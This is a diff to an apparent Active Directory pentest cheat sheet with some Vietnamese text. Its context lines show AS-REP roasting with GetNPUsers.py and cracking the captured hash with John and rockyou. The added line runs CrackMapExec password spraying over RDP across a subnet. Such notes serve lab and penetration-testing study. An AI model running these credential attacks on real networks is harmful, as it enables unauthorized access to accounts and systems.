@@ -174,6 +174,7 @@ python3 GetNPUsers.py <AD domain>/ -no-pass -usersfile /root/ADtools/users.txt -
 echo '[HASH]' > joshuahash.txt    hoặc sudo nano joshuahash.txt
 john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
 
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p “cupcake”
 
 ```
 # Privilege Escalation
